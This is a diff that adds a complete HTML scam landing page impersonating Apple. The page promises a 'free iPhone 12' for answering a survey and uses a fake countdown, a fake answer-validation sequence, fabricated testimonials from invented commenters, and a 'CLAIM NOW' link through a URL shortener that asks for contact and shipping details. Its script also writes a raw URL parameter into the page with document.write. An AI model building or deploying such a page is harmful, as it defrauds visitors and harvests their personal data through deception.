@@ -1,0 +1,272 @@
+<html>
+
+<head>
+    <base href="">
+    <meta charset="utf-8">
+    <meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOSNIPPET">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta name="referrer" content="no-referrer">
+    <meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOSNIPPET">
+    <title>Reward Center</title>
+
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <script>
+        function getURLParameter(name) {
+            name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+            var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+                results = regex.exec(location.search);
+            return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+        }
+    </script>
+    <script>
+        var lang_locale = "en";
+    </script>
+    <script src="js/jquery.min.js"></script>
+    <script src="js/dtime.js"></script>
+    <script>
+        window.onload = function() {
+            var t = 120,
+                e = document.querySelector("#time");
+            startTimer(t, e)
+        };
+    </script>
+     
+    <script>
+        $(document).ready(function() {
+            setTimeout(function() {
+                $("#comment1").fadeIn()
+            }, 1e4), setTimeout(function() {
+                $("#comment2").fadeIn()
+            }, 12e3), setTimeout(function() {
+                $("#comment3").fadeIn()
+            }, 13e3), setTimeout(function() {
+                $("#comment4").fadeIn()
+            }, 18e3), setTimeout(function() {
+                $("#comment5").fadeIn()
+            }, 2e4), setTimeout(function() {
+                $("#comment6").fadeIn()
+            }, 22e3), $(".bq1").click(function() {
+                $("#q1").fadeOut(0), $("#q2").fadeIn(500)
+            }), $(".bq2").click(function() {
+                $("#q2").fadeOut(0), $("#q3").fadeIn(500)
+            }), $(".bq3").click(function() {
+                $("#q3").fadeOut(0), $("#q4").fadeIn(500)
+            }), $(".bq4").click(function() {
+                $("#content1").fadeOut(0), $("#content2").fadeIn(), setTimeout(function() {
+                    $("#result1").fadeIn(1e3)
+                }, 3e3), setTimeout(function() {
+                    $("#result2").fadeIn(1e3)
+                }, 4500), setTimeout(function() {
+                    $("#result3").fadeIn(1e3)
+                }, 6e3), setTimeout(function() {
+                    $("#content2").fadeOut()
+                }, 7500), setTimeout(function() {
+                    $("#content3").fadeIn()
+                }, 7500)
+            })
+        });
+    </script>
+    
+</head>
+
+<body>
+    <audio autoplay="autoplay" preload="">
+        <source src="sounds/alert.mp3" type="audio/mpeg">
+    </audio>
+    
+    <div id="apple-nav" style="background: #656565;">
+	    <a style="float: left;text-decoration: none; line-height: 48px; padding: 0 10px;color: #cecece;">&nbsp;</a>
+		<a style="float: left;text-decoration: none; line-height: 48px; padding: 0 10px;color: #fff;">iPhone</a>
+		<a style="float: left;text-decoration: none; line-height: 48px; padding: 0 10px;color: #fff;">Watch</a>
+		<a style="float: left;text-decoration: none; line-height: 48px; padding: 0 10px;color: #fff;">iPad</a>
+		<a style="float: left;text-decoration: none; line-height: 48px; padding: 0 10px;color: #fff;">Mac</a>
+		<a style="float: right;text-decoration: none; line-height: 48px; padding: 10px;color: #fff;"><img src="images/search.png"></a>
+    </div>
+    <div class="content">
+        <h1 style="font-family: Tahoma, Geneva, sans-serif; font-weight: 400; font-size: 38px; padding-left: 0.2em;margin: 0px;">iPhone 12</h1>
+        <p class="dt">
+            <script type="text/javascript">
+                dtime(-1)
+            </script></p>
+        <div class="main-content flag" id="content1">
+            <h1 style="margin-bottom:5px">CONGRATULATIONS!</h1>
+            <h2>You've been randomly selected to test the new iPhone 12 (released in 2020)!</h2> <a href="#" style="display:none">Not For Humans</a>
+            <p style="font-weight: bold;font-size: 18px;color: #2e2e2e;text-align: center;">Additional testers wanted still: <span id="time" style="color:#0084ff;">19</span>
+            </p> <img src="images/iphone 12.jpg" style="max-width: 500px" width="100%">
+            <p>It's not a joke! You are invited to try our brand new iPhone 12 before it is distributed to the public. We're looking for another (30)
+                <script>
+                    document.write(getURLParameter('browser'));
+                </script>Chrome Mobile users for feedback to make this phone the best iPhone yet.</p>
+            <p>If you want to join our private test group, you have to answer the four questions below.</p>
+            <p> </p>
+            <p><span style="color:#cc0000;">As a "Thank You" gift, we will send an iPhone 12 64GB completely free!</span> Stocks are limited so answer quickly, act NOW!</p>
+            <div id="q1">
+                <p class="question"><strong>Question 1 of 4:</strong> Do you currently own any Apple products?</p>
+                <div class="button bq1">Yes</div>
+                <div class="button bq1">No</div>
+            </div>
+            <div id="q2">
+                <p class="question"><strong>Question 2 of 4:</strong> Which of these features would you most like to have in the iPhone 12?</p>
+                <div class="button bq2">Wireless charging</div>
+                <div class="button bq2">HD Display</div>
+            </div>
+            <div id="q3">
+                <p class="question"><strong>Question 3 of 4:</strong> Which of these messaging methods do you prefer?</p>
+                <div class="button bq3">Regular SMS</div>
+                <div class="button bq3">Video messages</div>
+            </div>
+            <div id="q4">
+                <p class="question"><strong>Question 4 of 4:</strong> Do you have a valid shipping address to receive your Apple products?</p>
+                <div class="button bq4">Yes</div>
+                <div class="button bq4">No</div>
+            </div>
+        </div>
+        <div class="main-content" id="content2">
+            <h1 style="text-align:center;">We are validating your answers...</h1>
+            <div class="loading">
+                <div class="spinner">
+                    <div class="bar1"></div>
+                    <div class="bar2"></div>
+                    <div class="bar3"></div>
+                    <div class="bar4"></div>
+                    <div class="bar5"></div>
+                    <div class="bar6"></div>
+                    <div class="bar7"></div>
+                    <div class="bar8"></div>
+                    <div class="bar9"></div>
+                    <div class="bar10"></div>
+                    <div class="bar11"></div>
+                    <div class="bar12"></div>
+                </div>
+            </div>
+            <p class="result" id="result1">No duplicated IPs found...</p>
+            <p class="result" id="result2">(3) Prizes remaining...</p>
+            <p class="result" id="result3">You are eligible to receive (1) iPhone 12 + an Apple t-shirt</p>
+        </div>
+        <div class="main-content" id="content3">
+            <h1 style="text-align:center;"> Congratulations! You are eligible to enter the private test group!</h1>
+            <h2>Click the button below to get your free iPhone 12. This is a small thank you for participating in the survey.</h2>
+            <h2 style="text-align:center;"><strong>Claim Your Gift Below</strong></h2>
+            <p class="loading"> <img src="images/iphone8-prize.jpg">
+            </p>
+            <a href="http://gestyy.com/etR8dG" rel="noreferrer" class="claim">
+                <div class="button2">CLAIM NOW</div>
+            </a>
+            <p style="text-align:center;">Please enter your contact details and a valid shipping address on the next page to receive your iPhone 12. Only (3) left in stock, so hurry!</p>
+        </div>
+        <div class="main-content">
+            <hr> <a href="#" style="display:none">Not For Humans</a>
+            <p style="color:#a8a7a7;"> <span style="color:#a8a7a7;cursor:pointer;" onclick="total_likes();return false" id="liked"></span> Comments </p>
+            <hr>
+            <div class="comments">
+                <p style="margin:0;padding:0;" id="total_likes"><span style="color:#3b5998;">12.068</span> Likes</p>
+            </div>
+            <div class="comments">
+                <p style="margin:0;padding:0;float:left;display:block;width:50%;"> <span style="color:#3b5998;">Show More Comments</span>
+                </p>
+                <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right;">50 of 80,312</p>
+                <div style="clear:both;"></div>
+            </div>
+            <div class="comments" id="comment3" style="opacity: 1; display: block;">
+                <div class="profile"> <img src="images/3.jpg"> </div>
+                <div class="comment-content">
+                    <p class="name">Jacob Lamm</p>
+                    <p>That's cool! I never win at anything! Thank you Apple! I have received the silver version</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Reply · Like · <img src="images/like.png" width="15px" height="15px">5</span> · Just now</div>
+            </div>
+            <div class="comments" id="comment2" style="opacity: 1; display: block;">
+                <div class="profile"> <img src="images/5.jpg"> </div>
+                <div class="comment-content">
+                    <p class="name">Roy Eyler</p>
+                    <p>I just got a call from the Courier, that I can pick up my prize. Am so glad that I took part.</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Reply · Like · <img src="images/like.png" width="15px" height="15px">100</span> · Just now</div>
+            </div>
+            <div class="comments" id="comment1" style="opacity: 1; display: block;">
+                <div class="profile"> <img src="images/6.jpg"> </div>
+                <div class="comment-content">
+                    <p class="name">George Miller</p>
+                    <p>Two days ago, I have invited 10 friends and qualified for the iPhone. Today I got it. Thank you Apple!</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Reply · Like · <img src="images/like.png" width="15px" height="15px">64</span> · Just now</div>
+            </div>
+            <div class="comments">
+                <div class="profile"> <img src="images/7.jpg"> </div>
+                <div class="comment-content">
+                    <p class="name">Norah Miller</p>
+                    <p>Mine came in the mail today. Thank you Apple for my iPhone (my T-shirt is too big. Can I replace it? :)!
+                        <br><img src="images/item1.png">
+                    </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Reply · Like · <img src="images/like.png" width="15px" height="15px">87</span> ·
+                    <script>
+                        dtime(-1);
+                    </script></div>
+            </div>
+            <div class="comments">
+                <div class="profile"> <img src="images/8.jpg"> </div>
+                <div class="comment-content">
+                    <p class="name">Jamie Byrnes</p>
+                    <p>I didn't know if this was serious or not but got my iPhone today!</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"> <span>Reply · Like · <img src="images/like.png" width="15px" height="15px">54</span> ·
+                    <script>
+                        dtime(-1);
+                    </script></div>
+            </div>
+            <div class="comments">
+                <div class="profile"> <img src="images/9.jpg"> </div>
+                <div class="comment-content">
+                    <p class="name">Clarence Reck</p>
+                    <p>Thought at first it was a joke but both iPhone 12 and this huge t-shirt actually came with the postman this morning. I want to participate in more surveys! lol
+                        <br><img src="images/item2.png">
+                    </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"> <span>Reply · Like · <img src="images/like.png" width="15px" height="15px">10</span> ·
+                    <script>
+                        dtime(-1);
+                    </script></div>
+            </div>
+            <div class="comments">
+                <div class="profile"> <img src="images/10.jpg"> </div>
+                <div class="comment-content">
+                    <p class="name">Gracie Aldrich</p>
+                    <p>Fantastic! An iPhone for free, for Gods sake! I tried to sign up for a second time to win another iPhone, but they called me because they realized that my email was duplicated. I asked for another t-shirt and they sent it to me ... I have two T-shirts now! LOOOL!</p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"> <span>Reply · Like · <img src="images/like.png" width="15px" height="15px">45</span> ·
+                    <script>
+                        dtime(1)
+                    </script></div>
+            </div>
+            <div class="comments">
+                <div class="profile"> <img src="images/11.jpg"> </div>
+                <div class="comment-content">
+                    <p class="name">Roger Marshall</p>
+                    <p>I actually saw this survey and ignored it because I thought it was a scam. Saw this ad again and decided to try it because I was bored ... Actually got a iPhone + blue t-shirt. TOTALLY INSANE!
+                        <br><img src="images/item3.png">
+                    </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Reply · Like · <img src="images/like.png" width="15px" height="15px">3</span> ·
+                    <script>
+                        dtime(2)
+                    </script></div>
+            </div>
+        </div>
+    </div>
+    <script>
+        function total_likes() {
+            'Ihnen und <span style="color:#3b5998;">12.068</span> gefällt das' == document.getElementById("total_likes").innerHTML ? (document.getElementById("total_likes").innerHTML = '<span style="color:#3b5998;">12.068</span> gefällt das', document.getElementById("liked").innerHTML = "Like") : (document.getElementById("total_likes").innerHTML = 'Ihnen und <span style="color:#3b5998;">12.068</span> gefällt das', document.getElementById("liked").innerHTML = "Unlike")
+        }
+    </script>
+</body>
+
+</html>
